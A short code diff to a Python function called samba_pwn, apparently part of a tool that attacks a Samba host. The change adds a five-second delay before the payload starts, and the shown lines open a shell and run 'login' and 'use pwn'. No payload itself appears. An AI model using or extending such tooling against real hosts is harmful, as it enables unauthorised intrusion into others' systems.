@@ -26,6 +26,8 @@ def samba_pwn(host,nousb):
         sleep(1)
         print(".",end="")
     print()
+    print("[Samba_pwn]: Waiting 5 secs before initiating payload")
+    sleep(5)
     print("[Samba_pwn]: Opening shell")
     shell.onecmd("login")
     shell.onecmd("use pwn")
